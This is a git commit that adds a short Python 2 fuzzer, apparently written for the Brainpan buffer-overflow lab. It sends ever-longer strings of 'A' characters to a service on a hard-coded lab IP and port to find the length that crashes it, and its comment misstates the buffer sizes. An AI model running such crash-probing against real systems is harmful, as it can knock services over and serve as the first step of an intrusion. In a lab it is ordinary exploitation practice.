03ddef6f5fd1d6b45f6d07a9233ecad16eb21d6c
Masscan <49980383+Masscan@users.noreply.github.com>
2019-04-25 12:01:59 +0000

    Add files via upload

---
+++ brainpan/fuzzer.py
@@ -0,0 +1,15 @@
+#!/usr/bin/python
+import socket
+# Create an array of buffers, from 1 to 5900, with increments of 200.
+buffer=["A"]
+counter=100
+while len(buffer) <= 30:
+	buffer.append("A"*counter)
+	counter=counter+200
+for string in buffer:
+	print "Fuzzing PASS with %s bytes" % len(string)
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect(('10.11.11.104',9999))
+	s.recv(1024)
+	s.send(string + '\r\n')
+	s.close()
